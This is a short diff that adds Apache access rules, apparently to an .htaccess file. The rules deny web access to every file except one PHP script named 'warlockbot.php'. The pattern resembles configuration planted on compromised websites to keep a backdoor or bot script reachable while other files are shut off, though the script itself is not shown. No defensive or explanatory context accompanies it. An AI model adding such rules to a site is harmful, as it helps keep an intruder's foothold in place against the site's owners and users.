@@ -1,0 +1,4 @@
+Order Allow,Deny
+<FilesMatch "^warlockbot\.php$">
+Allow from all
+</FilesMatch>
